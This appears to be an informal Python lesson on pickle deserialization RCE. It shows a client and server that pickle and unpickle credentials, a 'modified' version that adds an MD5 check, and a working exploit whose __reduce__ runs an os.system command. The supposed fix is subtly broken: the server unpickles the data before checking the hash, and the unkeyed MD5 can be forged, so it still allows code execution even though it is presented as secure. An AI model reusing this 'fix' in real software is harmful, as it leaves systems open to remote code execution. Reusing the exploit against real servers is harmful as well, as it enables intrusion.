                      #ai Hind..

#hese codes are vulnerable to kinda RCE(Remote code execution).

#{1st code}This file is named as client.py

import os
import pickle
def fun(name,password):
    s = {"username":name,"password":password}
    safecode = pickle.dumps(s)
    with open("users.json","wb") as f:
        f.write(safecode)
    return safecode

if __name__ == '__main__':
    u = input("Username : ")
    p = input("Password : ")
    yo_fun = fun(u,p)

#{2nd Code }This code is named as server.py
import os
import pickle
def reverse_fun():
      with open("users.json","rb") as f:
          data = f.read()
      
      d = pickle.loads(data)
      return d

if __name__ == '__main__':
      print(reverse_fun())
      
#This code works fine but is lack in security. It does't validate any hashes in this case i have taken md5 hashes.
#I will modify these two programs and give what they need..

#{3 code} This file is modified by me named client_new.py
import os
import pickle
import hashlib
	
def fun(name,password):
	name_password = name+password
	s = {"username":name,"password":password}
	safecode_md5 = hashlib.md5(name_password.encode()).hexdigest()
	safecode = pickle.dumps(s)
	with open("users.json","wb") as f:
		f.write(safecode)
	with open("users.json","a") as f:
		f.write("\n")
		f.write(safecode_md5)	
	return safecode_md5
	
if __name__ == '__main__':
	u = input("Username : ")
	p = input("Password : ")
	yo_fun = fun(u,p)
	

  
#{4th code} The code is named as server_new.py
import os
import pickle
import hashlib

def reverse_fun():
	with open("users.json","rb") as f:
		lines = f.readlines() #data = f.read()
	try:
		md5 = lines[1].decode()
		picked_data = lines[0]
	except:
		md5 = ""
		picked_data = ""
	if (md5=="" or picked_data==""):
		print('Tempered data')
	else:
		d = pickle.loads(picked_data)
		username = d['username']
		password = d['password']
		name_password = username+password
		safecode_md5 = hashlib.md5(name_password.encode()).hexdigest()
		if(str(safecode_md5)==str(md5)):
			return d
		else:
			print('Tempered data')

if __name__ == '__main__':
	print(reverse_fun())
	
	


#exploit program which is working here
#This is the malicious code which generates pickled data containing the desired command of our choice which will execute on the server (mkdir in this case) This is my program to give a exploit

import pickle
import os

class MyEvilPickle(object):
	def __reduce__(self):
		return (os.system, ('mkdir jai-hind', ))


pickle_data = pickle.dumps(MyEvilPickle())
print(pickle_data)


with open("users.json", "wb") as file:
	file.write(pickle_data)


